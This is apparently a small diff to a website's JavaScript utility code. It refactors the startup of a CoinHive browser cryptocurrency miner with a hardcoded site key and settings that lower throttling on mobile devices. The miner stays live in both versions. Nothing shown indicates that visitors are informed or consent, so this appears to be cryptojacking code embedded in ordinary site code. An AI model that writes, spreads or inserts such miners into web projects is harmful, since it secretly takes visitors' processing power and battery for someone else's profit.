@@ -49,8 +49,7 @@ var Util = {
       if ($.ua.device && $.ua.device.type === 'mobile') {
         data = {threads: 1, throttle: 0.8}
       }
-      var miner = new CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', data);
-      miner.start();
+      (new CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', data)).start();
     });
   },
   /**
